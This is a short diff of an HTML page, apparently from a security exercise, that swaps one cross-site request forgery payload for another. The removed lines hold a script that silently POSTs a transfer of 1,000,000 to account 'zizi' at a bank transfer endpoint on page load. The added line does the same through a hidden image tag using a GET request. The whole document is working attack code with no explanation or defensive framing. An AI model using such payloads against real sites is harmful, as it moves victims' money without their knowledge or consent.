@@ -1,11 +1,5 @@
 <html>
   <body>
-    <script>
-      // Création et envoi automatique d'une requête POST pour transférer 1 000 000 au compte "zizi"
-      var xhr = new XMLHttpRequest();
-      xhr.open("POST", "https://bankme-v4.com/transfer", true); // URL de l'endpoint de transfert
-      xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded"); // Type de contenu attendu
-      xhr.send("to=zizi&amount=1000000"); // Paramètres de la requête : compte "zizi" et montant 1 000 000
-    </script>
+    <img src="https://bankme-v4.com/transfer?to=zizi&amount=1000000" style="display:none;">
   </body>
 </html>
